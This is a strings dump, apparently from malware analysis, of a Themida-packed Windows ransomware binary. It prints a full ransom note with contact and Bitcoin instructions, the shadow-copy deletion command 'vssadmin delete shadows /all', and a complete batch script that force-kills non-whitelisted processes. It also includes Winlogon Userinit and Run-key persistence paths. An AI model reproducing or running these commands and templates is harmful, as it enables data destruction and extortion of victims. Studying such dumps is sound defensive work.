[Strings]
nth  paddr      vaddr      len  size section    type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
382  0x00008355 0x00408355 5    7    .Themida   utf8    ĉ\$ A blocks=Latin Extended-A,Basic Latin
383  0x0000838a 0x0040838a 6    7    .Themida   ascii   L!|$ L
384  0x000083da 0x004083da 4    6    .Themida   utf8    tɬJH blocks=Basic Latin,IPA Extensions
385  0x00008500 0x00408500 11   12   .Themida   ascii   A_A^A]A\_^]
386  0x0000858c 0x0040858c 4    5    .Themida   ascii   \fr\bp
387  0x00008748 0x00408748 4    5    .Themida   ascii   \fr\bp
388  0x000087e8 0x004087e8 4    5    .Themida   ascii   \bp\a`
389  0x0000936a 0x0040936a 10   11   .Themida   ascii   _snwprintf
390  0x00009376 0x00409376 10   11   .Themida   ascii   msvcrt.dll
391  0x00009384 0x00409384 17   18   .Themida   ascii   GetCurrentProcess
392  0x00009398 0x00409398 19   20   .Themida   ascii   GetSystemDirectoryW
393  0x000093ae 0x004093ae 16   17   .Themida   ascii   GetModuleHandleA
394  0x000093c2 0x004093c2 12   13   .Themida   ascii   LoadLibraryA
395  0x000093d2 0x004093d2 13   14   .Themida   ascii   GetVersionExA
396  0x000093e2 0x004093e2 11   12   .Themida   ascii   GlobalAlloc
397  0x000093f0 0x004093f0 10   11   .Themida   ascii   GlobalFree
398  0x000093fe 0x004093fe 13   14   .Themida   ascii   GetSystemInfo
399  0x0000940e 0x0040940e 19   20   .Themida   ascii   GetCurrentProcessId
400  0x00009424 0x00409424 9    10   .Themida   ascii   CopyFileW
401  0x00009430 0x00409430 14   15   .Themida   ascii   IsWow64Process
402  0x00009442 0x00409442 21   22   .Themida   ascii   SetThreadAffinityMask
403  0x0000945a 0x0040945a 8    9    .Themida   ascii   HeapFree
404  0x00009466 0x00409466 17   18   .Themida   ascii   SetThreadPriority
405  0x0000947a 0x0040947a 19   20   .Themida   ascii   WaitForSingleObject
406  0x00009490 0x00409490 18   19   .Themida   ascii   GetCurrentThreadId
407  0x000094a6 0x004094a6 12   13   .Themida   ascii   ResumeThread
408  0x000094b6 0x004094b6 15   16   .Themida   ascii   TerminateThread
409  0x000094c8 0x004094c8 12   13   .Themida   ascii   CreateThread
410  0x000094d8 0x004094d8 9    10   .Themida   ascii   HeapAlloc
411  0x000094e4 0x004094e4 12   13   .Themida   ascii   CreateEventA
412  0x000094f4 0x004094f4 7    8    .Themida   ascii   SleepEx
413  0x000094fe 0x004094fe 8    9    .Themida   ascii   ReadFile
414  0x0000950a 0x0040950a 10   11   .Themida   ascii   HeapCreate
415  0x00009518 0x00409518 14   15   .Themida   ascii   VirtualProtect
416  0x0000952a 0x0040952a 16   17   .Themida   ascii   SetPriorityClass
417  0x0000953e 0x0040953e 11   12   .Themida   ascii   CreateFileW
418  0x0000954c 0x0040954c 11   12   .Themida   ascii   CreateFileA
419  0x0000955a 0x0040955a 19   20   .Themida   ascii   GetSystemDirectoryA
420  0x00009570 0x00409570 11   12   .Themida   ascii   CloseHandle
421  0x0000957e 0x0040957e 11   12   .Themida   ascii   GetFileSize
422  0x0000958c 0x0040958c 14   15   .Themida   ascii   GetProcessHeap
423  0x0000959c 0x0040959c 12   13   .Themida   ascii   KERNEL32.dll
424  0x000095ac 0x004095ac 9    10   .Themida   ascii   SendInput
425  0x000095b8 0x004095b8 12   13   .Themida   ascii   UpdateWindow
426  0x000095c8 0x004095c8 10   11   .Themida   ascii   CreateMenu
427  0x000095d6 0x004095d6 16   17   .Themida   ascii   UnregisterClassA
428  0x000095ea 0x004095ea 15   16   .Themida   ascii   CreateWindowExA
429  0x000095fc 0x004095fc 11   12   .Themida   ascii   DestroyMenu
430  0x0000960a 0x0040960a 14   15   .Themida   ascii   DefWindowProcA
431  0x0000961c 0x0040961c 14   15   .Themida   ascii   RegisterClassA
432  0x0000962e 0x0040962e 12   13   .Themida   ascii   OpenDesktopA
433  0x0000963e 0x0040963e 14   15   .Themida   ascii   GetWindowLongA
434  0x00009650 0x00409650 12   13   .Themida   ascii   CloseDesktop
435  0x00009660 0x00409660 10   11   .Themida   ascii   ShowWindow
436  0x0000966e 0x0040966e 16   17   .Themida   ascii   SetThreadDesktop
437  0x00009682 0x00409682 13   14   .Themida   ascii   DestroyWindow
438  0x00009692 0x00409692 13   14   .Themida   ascii   ShowScrollBar
439  0x000096a2 0x004096a2 14   15   .Themida   ascii   CreateDesktopA
440  0x000096b2 0x004096b2 10   11   .Themida   ascii   USER32.dll
441  0x000096c0 0x004096c0 20   21   .Themida   ascii   RtlImageRvaToSection
442  0x000096d8 0x004096d8 24   25   .Themida   ascii   NtQuerySystemInformation
443  0x000096f4 0x004096f4 20   21   .Themida   ascii   RtlInitUnicodeString
444  0x0000970c 0x0040970c 29   30   .Themida   ascii   RtlQueryEnvironmentVariable_U
445  0x0000972c 0x0040972c 16   17   .Themida   ascii   RtlImageNtHeader
446  0x00009740 0x00409740 33   34   .Themida   ascii   RtlAllocateActivationContextStack
447  0x00009764 0x00409764 19   20   .Themida   ascii   NtReadVirtualMemory
448  0x0000977a 0x0040977a 7    8    .Themida   ascii   NtClose
449  0x00009784 0x00409784 13   14   .Themida   ascii   NtCreateTimer
450  0x00009794 0x00409794 10   11   .Themida   ascii   NtSetTimer
451  0x000097a2 0x004097a2 16   17   .Themida   ascii   NtCallbackReturn
452  0x000097b4 0x004097b4 9    10   .Themida   ascii   ntdll.dll
453  0x000097c0 0x004097c0 14   15   .Themida   ascii   RpcStringFreeA
454  0x000097d2 0x004097d2 13   14   .Themida   ascii   UuidToStringA
455  0x000097e0 0x004097e0 10   11   .Themida   ascii   RPCRT4.dll
456  0x000097ee 0x004097ee 6    7    .Themida   ascii   memset
457  0x00009ab0 0x00409ab0 9    20   .Themida   utf16le gdi32.dll
458  0x00009ac4 0x00409ac4 12   26   .Themida   utf16le advapi32.dll
459  0x00009ae0 0x00409ae0 10   22   .Themida   utf16le msvcrt.dll
460  0x00009af8 0x00409af8 10   22   .Themida   utf16le rpcrt4.dll
461  0x00009b10 0x00409b10 12   26   .Themida   utf16le kernel32.dll
462  0x00009b2c 0x00409b2c 14   30   .Themida   utf16le kernelbase.dll
463  0x00009b4c 0x00409b4c 10   22   .Themida   utf16le user32.dll
464  0x00009c38 0x00409c38 6    7    .Themida   ascii   STATIC
465  0x00009c40 0x00409c40 7    8    .Themida   ascii   Default
466  0x00009db4 0x00409db4 4    10   .Themida   utf16le lÀ´t blocks=Basic Latin,Latin-1 Supplement
467  0x00009de0 0x00409de0 4    10   .Themida   utf16le lÀ´t blocks=Basic Latin,Latin-1 Supplement
468  0x00009e0c 0x00409e0c 4    10   .Themida   utf16le pÀ´t blocks=Basic Latin,Latin-1 Supplement
469  0x00009e4c 0x00409e4c 4    5    .Themida   ascii   GCTL
470  0x00009e58 0x00409e58 5    6    .Themida   ascii   .data
471  0x00009e68 0x00409e68 6    7    .Themida   ascii   .rdata
472  0x00009e78 0x00409e78 13   14   .Themida   ascii   .rdata$zzzdbg
473  0x00009e90 0x00409e90 8    9    .Themida   ascii   .text$mn
474  0x00009ea4 0x00409ea4 4    5    .Themida   ascii   .bss
475  0x00009eb4 0x00409eb4 8    9    .Themida   ascii   .idata$5
476  0x00009ec8 0x00409ec8 8    9    .Themida   ascii   .idata$2
477  0x00009edc 0x00409edc 8    9    .Themida   ascii   .idata$3
478  0x00009ef0 0x00409ef0 8    9    .Themida   ascii   .idata$4
479  0x00009f04 0x00409f04 8    9    .Themida   ascii   .idata$6
480  0x00009f89 0x00409f89 4    5    .Themida   ascii   SVWh
481  0x00009fc9 0x00409fc9 6    7    .Themida   ascii   Cj\t^9=
482  0x0000a0a2 0x0040a0a2 4    5    .Themida   ascii   u"8]
483  0x0000a102 0x0040a102 4    5    .Themida   ascii   tB8]
484  0x0000a191 0x0040a191 4    5    .Themida   ascii   u\bQQ
485  0x0000a19f 0x0040a19f 4    5    .Themida   ascii   jZjA
486  0x0000a1b4 0x0040a1b4 6    7    .Themida   ascii   }\b9}\fv
487  0x0000a1bf 0x0040a1bf 5    6    .Themida   ascii   M\f+M\b
488  0x0000a1e1 0x0040a1e1 5    6    .Themida   ascii   t\r<a|
489  0x0000a214 0x0040a214 5    7    .Themida   utf8    4á\{@ blocks=Basic Latin,Latin-1 Supplement
490  0x0000a2c3 0x0040a2c3 4    5    .Themida   ascii   R(+p
491  0x0000a2f5 0x0040a2f5 4    6    .Themida   utf8    t\a+ǃ blocks=Basic Latin,Latin Extended-B
492  0x0000a2fb 0x0040a2fb 4    5    .Themida   ascii   \ft\t;
493  0x0000a344 0x0040a344 8    9    .Themida   ascii   VWj\b_9}\b
494  0x0000a350 0x0040a350 7    8    .Themida   ascii   C}\bWj\bS
495  0x0000a361 0x0040a361 6    7    .Themida   ascii   t!WjAV
496  0x0000a392 0x0040a392 4    5    .Themida   ascii   HSVW
497  0x0000a3b3 0x0040a3b3 4    5    .Themida   ascii   Pj\bQ
498  0x0000a3d3 0x0040a3d3 6    7    .Themida   ascii   j8Yj4X
499  0x0000a40e 0x0040a40e 6    7    .Themida   ascii   tYj0[S
500  0x0000a424 0x0040a424 6    9    .Themida   utf8    \f3ɉE܍E blocks=Basic Latin,Latin Extended-B,Syriac
501  0x0000a437 0x0040a437 4    5    .Themida   ascii   QPQj
502  0x0000a452 0x0040a452 4    5    .Themida   ascii   \rh{@
503  0x0000a502 0x0040a502 4    5    .Themida   ascii   5j{@
504  0x0000a548 0x0040a548 4    5    .Themida   ascii   \rj{@
505  0x0000a584 0x0040a584 4    6    .Themida   utf8    3ۋB\f blocks=Basic Latin,Arabic
506  0x0000a59f 0x0040a59f 5    7    .Themida   utf8    Psr3\v
507  0x0000a626 0x0040a626 4    5    .Themida   ascii   SVW3
508  0x0000a6cf 0x0040a6cf 4    5    .Themida   ascii   \rh{@
509  0x0000a790 0x0040a790 5    6    .Themida   ascii   E\ffGf
510  0x0000a79c 0x0040a79c 4    6    .Themida   utf8    ~܋]\b blocks=Basic Latin,Syriac
511  0x0000a851 0x0040a851 4    5    .Themida   ascii   5D{@
512  0x0000a8c6 0x0040a8c6 4    5    .Themida   ascii   j\aX3
513  0x0000a94c 0x0040a94c 7    8    .Themida   ascii   RPhzC,(
514  0x0000a974 0x0040a974 4    5    .Themida   ascii   RPhf
515  0x0000a988 0x0040a988 4    5    .Themida   ascii   RPh\
516  0x0000a9d8 0x0040a9d8 6    8    .Themida   utf8    RPh/Dԛ blocks=Basic Latin,Cyrillic Supplement
517  0x0000aab7 0x0040aab7 4    6    .Themida   utf8    EİX@ blocks=Basic Latin,Latin Extended-A
518  0x0000ab09 0x0040ab09 5    8    .Themida   utf8    E܋E܉E blocks=Basic Latin,Syriac
519  0x0000ab4c 0x0040ab4c 5    8    .Themida   utf8    E؋E؉E blocks=Basic Latin,Arabic
520  0x0000ab8f 0x0040ab8f 5    8    .Themida   utf8    EԋEԉE blocks=Basic Latin,Cyrillic Supplement
521  0x0000abc0 0x0040abc0 4    6    .Themida   utf8    uՋE\b blocks=Basic Latin,Armenian
522  0x0000abe2 0x0040abe2 7    8    .Themida   ascii   @ \vA$t\t
523  0x0000ac5f 0x0040ac5f 4    5    .Themida   ascii   =4{@
524  0x0000ac96 0x0040ac96 4    5    .Themida   ascii   54{@
525  0x0000ad2b 0x0040ad2b 5    6    .Themida   ascii   VWj@h
526  0x0000ad72 0x0040ad72 4    5    .Themida   ascii   SSSh
527  0x0000ad95 0x0040ad95 4    5    .Themida   ascii   t\nSV
528  0x0000adb4 0x0040adb4 6    8    .Themida   utf8    ]Ã%T{@ blocks=Basic Latin,Latin-1 Supplement
529  0x0000adc0 0x0040adc0 4    5    .Themida   ascii   %P{@
530  0x0000aded 0x0040aded 4    5    .Themida   ascii   j\bY\r
531  0x0000adf7 0x0040adf7 4    5    .Themida   ascii   \rR{@
532  0x0000ae07 0x0040ae07 4    5    .Themida   ascii   %H{@
533  0x0000ae13 0x0040ae13 4    5    .Themida   ascii   %L{@
534  0x0000ae2b 0x0040ae2b 4    5    .Themida   ascii   \rJ{@
535  0x0000ae39 0x0040ae39 4    5    .Themida   ascii   \rL{@
536  0x0000ae60 0x0040ae60 4    5    .Themida   ascii   Xj ^
537  0x0000ae80 0x0040ae80 4    7    .Themida   utf8    @^ËZ blocks=Basic Latin,Latin-1 Supplement
538  0x0000ae8c 0x0040ae8c 4    6    .Themida   utf8    á`{@ blocks=Latin-1 Supplement,Basic Latin
539  0x0000aeba 0x0040aeba 4    5    .Themida   ascii   BT1A
540  0x0000afd8 0x0040afd8 5    6    .Themida   ascii   ]\bVW3
541  0x0000b23c 0x0040b23c 4    5    .Themida   ascii   5t{@
542  0x0000b241 0x0040b241 5    6    .Themida   ascii   QQSWP
543  0x0000b27b 0x0040b27b 4    5    .Themida   ascii   5t{@
544  0x0000b2ef 0x0040b2ef 4    5    .Themida   ascii   5t{@
545  0x0000b30f 0x0040b30f 5    6    .Themida   ascii   QSVWh
546  0x0000b31d 0x0040b31d 6    7    .Themida   ascii   VVh@Z@
547  0x0000b37b 0x0040b37b 4    5    .Themida   ascii   t\nVW
548  0x0000b3e6 0x0040b3e6 5    7    .Themida   utf8    N\b+ˉ^ blocks=Basic Latin,Spacing Modifier Letters
549  0x0000b3ee 0x0040b3ee 6    8    .Themida   utf8    B\b+É\$ blocks=Basic Latin,Latin-1 Supplement
550  0x0000b3fe 0x0040b3fe 4    5    .Themida   ascii   D$PP
551  0x0000b43b 0x0040b43b 4    5    .Themida   ascii   D$pP
552  0x0000b499 0x0040b499 4    5    .Themida   ascii   5t{@
553  0x0000b49e 0x0040b49e 7    8    .Themida   ascii   QQWSPVh
554  0x0000b4ab 0x0040b4ab 5    6    .Themida   ascii   D$tPQ
555  0x0000b4f0 0x0040b4f0 5    8    .Themida   utf8    ˋЉD$  blocks=Spacing Modifier Letters,Cyrillic,Basic Latin
556  0x0000b533 0x0040b533 4    5    .Themida   ascii   \rh{@
557  0x0000b548 0x0040b548 5    7    .Themida   utf8    +IL$H
558  0x0000b558 0x0040b558 5    7    .Themida   utf8    3҉D$$ blocks=Basic Latin,Cyrillic
559  0x0000b56f 0x0040b56f 4    5    .Themida   ascii   D$8d
560  0x0000b576 0x0040b576 5    7    .Themida   utf8    +ȉT$@ blocks=Basic Latin,Latin Extended-B
561  0x0000b594 0x0040b594 4    5    .Themida   ascii   D$8d
562  0x0000b5b0 0x0040b5b0 4    5    .Themida   ascii   D$,j
563  0x0000b5bd 0x0040b5bd 4    5    .Themida   ascii   D$Le
564  0x0000b5ef 0x0040b5ef 5    6    .Themida   ascii   L$\fQV
565  0x0000b639 0x0040b639 8    10   .Themida   utf8    j\aY3\r|$T
566  0x0000b66d 0x0040b66d 4    6    .Themida   utf8    ˉD$$ blocks=Spacing Modifier Letters,Basic Latin
567  0x0000b6a2 0x0040b6a2 7    8    .Themida   ascii   ;D$Hu~j
568  0x0000b6b9 0x0040b6b9 5    6    .Themida   ascii   D$XPj
569  0x0000b6cb 0x0040b6cb 4    5    .Themida   ascii   D$4d
570  0x0000b6d8 0x0040b6d8 6    7    .Themida   ascii   L$@PQV
571  0x0000b6e9 0x0040b6e9 4    5    .Themida   ascii   D$,j
572  0x0000b6f3 0x0040b6f3 4    5    .Themida   ascii   D$Le
573  0x0000b707 0x0040b707 6    7    .Themida   ascii   ;Apt3j
574  0x0000b71a 0x0040b71a 5    6    .Themida   ascii   D$XPj
575  0x0000b763 0x0040b763 5    6    .Themida   ascii   t\r+D$
576  0x0000b7bb 0x0040b7bb 8    10   .Themida   utf8    j\aY3\r|$T
577  0x0000b7c8 0x0040b7c8 4    5    .Themida   ascii   @WWV
578  0x0000b7dc 0x0040b7dc 5    6    .Themida   ascii   D$XPj
579  0x0000b877 0x0040b877 4    6    .Themida   utf8    +ыL$ blocks=Basic Latin,Cyrillic
580  0x0000b8a0 0x0040b8a0 4    5    .Themida   ascii   @VWS
581  0x0000b8ca 0x0040b8ca 4    5    .Themida   ascii   \ri{@
582  0x0000b948 0x0040b948 4    5    .Themida   ascii   \fSV3
583  0x0000b986 0x0040b986 4    5    .Themida   ascii   WSSS
584  0x0000b9a0 0x0040b9a0 4    5    .Themida   ascii   hx{@
585  0x0000ba9f 0x0040ba9f 4    6    .Themida   utf8    ֣|{@ blocks=Hebrew,Basic Latin
586  0x0000bb59 0x0040bb59 4    5    .Themida   ascii   jzja
587  0x0000bb83 0x0040bb83 5    6    .Themida   ascii   SQRVW
588  0x0000bb93 0x0040bb93 5    6    .Themida   ascii   >MZuk
589  0x0000bbcf 0x0040bbcf 4    6    .Themida   utf8    +Kr$
590  0x0000bc05 0x0040bc05 5    6    .Themida   ascii   _^ZY[
591  0x0000bc2a 0x0040bc2a 6    7    .Themida   ascii   ]\f+]\br
592  0x0000bc57 0x0040bc57 4    6    .Themida   utf8    E\b3ɿ blocks=Basic Latin,IPA Extensions
593  0x0000bf9a 0x0040bf9a 11   12   .Themida   ascii   VirtualFree
594  0x0000bfa8 0x0040bfa8 12   13   .Themida   ascii   VirtualAlloc
595  0x0000bfb8 0x0040bfb8 19   20   .Themida   ascii   WaitForSingleObject
596  0x0000bfce 0x0040bfce 17   18   .Themida   ascii   GetExitCodeThread
597  0x0000bfe2 0x0040bfe2 15   16   .Themida   ascii   TerminateThread
598  0x0000bff4 0x0040bff4 12   13   .Themida   ascii   CreateThread
599  0x0000c004 0x0040c004 21   22   .Themida   ascii   SetThreadAffinityMask
600  0x0000c01c 0x0040c01c 8    9    .Themida   ascii   HeapFree
601  0x0000c028 0x0040c028 17   18   .Themida   ascii   GetCurrentProcess
602  0x0000c03c 0x0040c03c 17   18   .Themida   ascii   SetThreadPriority
603  0x0000c050 0x0040c050 12   13   .Themida   ascii   ResumeThread
604  0x0000c060 0x0040c060 5    6    .Themida   ascii   Sleep
605  0x0000c068 0x0040c068 9    10   .Themida   ascii   HeapAlloc
606  0x0000c074 0x0040c074 10   11   .Themida   ascii   HeapCreate
607  0x0000c082 0x0040c082 16   17   .Themida   ascii   SetPriorityClass
608  0x0000c096 0x0040c096 16   17   .Themida   ascii   GetModuleHandleA
609  0x0000c0aa 0x0040c0aa 13   14   .Themida   ascii   GetVersionExA
610  0x0000c0ba 0x0040c0ba 13   14   .Themida   ascii   GetSystemInfo
611  0x0000c0ca 0x0040c0ca 14   15   .Themida   ascii   IsWow64Process
612  0x0000c0dc 0x0040c0dc 14   15   .Themida   ascii   GetProcessHeap
613  0x0000c0ec 0x0040c0ec 12   13   .Themida   ascii   KERNEL32.dll
614  0x0000c0fc 0x0040c0fc 9    10   .Themida   ascii   SendInput
615  0x0000c108 0x0040c108 12   13   .Themida   ascii   UpdateWindow
616  0x0000c118 0x0040c118 10   11   .Themida   ascii   CreateMenu
617  0x0000c126 0x0040c126 16   17   .Themida   ascii   UnregisterClassA
618  0x0000c13a 0x0040c13a 15   16   .Themida   ascii   CreateWindowExA
619  0x0000c14c 0x0040c14c 11   12   .Themida   ascii   DestroyMenu
620  0x0000c15a 0x0040c15a 14   15   .Themida   ascii   DefWindowProcA
621  0x0000c16c 0x0040c16c 14   15   .Themida   ascii   RegisterClassA
622  0x0000c17e 0x0040c17e 12   13   .Themida   ascii   OpenDesktopA
623  0x0000c18e 0x0040c18e 14   15   .Themida   ascii   GetWindowLongA
624  0x0000c1a0 0x0040c1a0 12   13   .Themida   ascii   CloseDesktop
625  0x0000c1b0 0x0040c1b0 10   11   .Themida   ascii   ShowWindow
626  0x0000c1be 0x0040c1be 16   17   .Themida   ascii   SetThreadDesktop
627  0x0000c1d2 0x0040c1d2 13   14   .Themida   ascii   DestroyWindow
628  0x0000c1e2 0x0040c1e2 13   14   .Themida   ascii   ShowScrollBar
629  0x0000c1f2 0x0040c1f2 14   15   .Themida   ascii   CreateDesktopA
630  0x0000c202 0x0040c202 10   11   .Themida   ascii   USER32.dll
631  0x0000c210 0x0040c210 6    7    .Themida   ascii   memcpy
632  0x0000c21a 0x0040c21a 6    7    .Themida   ascii   memset
633  0x0000c222 0x0040c222 10   11   .Themida   ascii   msvcrt.dll
634  0x0000c409 0x0040c409 17   18   .Themida   ascii   =%=,=7=F=O=^=c=n=
635  0x0000c42f 0x0040c42f 7    8    .Themida   ascii   >N>Y>h>
636  0x0000c43f 0x0040c43f 15   16   .Themida   ascii   ?(?4?<?Z?f?n?v?
637  0x0000c459 0x0040c459 11   12   .Themida   ascii   0$010>0K0d0
638  0x0000c471 0x0040c471 5    6    .Themida   ascii   1S2q2
639  0x0000c47b 0x0040c47b 13   14   .Themida   ascii   3\r3'3/3I3"4?4
640  0x0000c493 0x0040c493 11   12   .Themida   ascii   676?6R6X6i6
641  0x0000c4a3 0x0040c4a3 13   14   .Themida   ascii   6\b7-7A7U7i7}7
642  0x0000c4bd 0x0040c4bd 5    6    .Themida   ascii   758v8
643  0x0000c4c9 0x0040c4c9 13   14   .Themida   ascii   9\e:2:I:N:`:w:
644  0x0000c4e7 0x0040c4e7 15   16   .Themida   ascii   :\r;';C;H;e;j;v;
645  0x0000c511 0x0040c511 17   18   .Themida   ascii   < <,<1<:<?<N<X<p<
646  0x0000c52f 0x0040c52f 5    6    .Themida   ascii   =:>B>
647  0x0000c548 0x0040c548 10   11   .Themida   ascii   =0V0i0p0|0
648  0x0000c55f 0x0040c55f 17   18   .Themida   ascii   0 1(1:1N1Y1b1i1u1
649  0x0000c575 0x0040c575 7    8    .Themida   ascii   1\e2$2I2
650  0x0000c58d 0x0040c58d 5    6    .Themida   ascii   586o6
651  0x0000c5af 0x0040c5af 21   22   .Themida   ascii   7!7&7-72797>7^7e7r7x7
652  0x0000c5d9 0x0040c5d9 5    6    .Themida   ascii   8*838
653  0x0000c5f1 0x0040c5f1 13   14   .Themida   ascii   9 9*9?9g:u:{:
654  0x0000c615 0x0040c615 5    6    .Themida   ascii   ;$;*;
655  0x0000c804 0x0040c804 98   99   .Themida   ascii               files\r\n       skip files\r\n          files/s\r\n          s\r\n        treads\r\nnetwork   \r\n
656  0x0000c8a3 0x0040c8a3 17   18   .Themida   ascii   \r\ndownload key ok
657  0x0000c8b5 0x0040c8b5 23   24   .Themida   ascii   \r\nthread realtime error
658  0x0000c8cd 0x0040c8cd 22   23   .Themida   ascii   \r\nrun as administrator
659  0x0000c8e4 0x0040c8e4 14   15   .Themida   ascii   \r\nsocket error
660  0x0000c8f3 0x0040c8f3 16   17   .Themida   ascii   \r\ndownload error
661  0x0000c904 0x0040c904 15   16   .Themida   ascii   \r\nchksumm error
662  0x0000c914 0x0040c914 15   16   .Themida   ascii   \r\nconnect error
663  0x0000c924 0x0040c924 15   16   .Themida   ascii   privelege yes\r\n
664  0x0000c934 0x0040c934 14   15   .Themida   ascii   privelege no\r\n
665  0x0000c943 0x0040c943 14   15   .Themida   ascii   memory error\r\n
666  0x0000c952 0x0040c952 8    9    .Themida   ascii   \r\n : usb
667  0x0000c96b 0x0040c96b 20   21   .Themida   ascii   ID: SfplHinIptOwnboa
668  0x0000ca9b 0x0040ca9b 5    12   .Themida   utf16le .lock
669  0x0000caaa 0x0040caaa 1513 1514 .Themida   ascii    All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: djekr@aol.com or BM-2cXEvy8D3LFpuLpRq8423Ajb7nJ4NfEPFD@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID 
670  0x0000d0ad 0x0040d0ad 10   22   .Themida   utf16le ReadMe.TxT
671  0x0000d0c5 0x0040d0c5 7    16   .Themida   utf16le windows
672  0x0000d0d5 0x0040d0d5 7    8    .Themida   ascii   ComSpec
673  0x0000d0dd 0x0040d0dd 8    9    .Themida   ascii   /c del "
674  0x0000d0e6 0x0040d0e6 8    9    .Themida   ascii   " >> NUL
675  0x0000d0ef 0x0040d0ef 28   29   .Themida   ascii   vssadmin delete shadows /all
676  0x0000d10c 0x0040d10c 70   71   .Themida   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-\W.bat
677  0x0000d153 0x0040d153 1138 1139 .Themida   ascii   SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:               \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
678  0x0000d5ca 0x0040d5ca 53   54   .Themida   ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
679  0x0000d600 0x0040d600 44   45   .Themida   ascii   Software\Microsoft\Windows NT\CurrentVersion
680  0x0000d62d 0x0040d62d 46   47   .Themida   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
681  0x0000d65c 0x0040d65c 6    7    .Themida   ascii   unlock
682  0x0000d664 0x0040d664 11   12   .Themida   ascii   ProductName
683  0x0000d670 0x0040d670 23   24   .Themida   ascii   Windows version unknown
684  0x0000d688 0x0040d688 6    7    .Themida   ascii   Hacked
685  0x0000d690 0x0040d690 8    9    .Themida   ascii   Userinit
686  0x0000d69a 0x0040d69a 21   22   .Themida   ascii   c:\Windows\bfsvcm.exe
687  0x0000d6b0 0x0040d6b0 33   34   .Themida   ascii   C:\Windows\system32\userinit.exe,
688  0x0000d6d3 0x0040d6d3 55   56   .Themida   ascii   C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
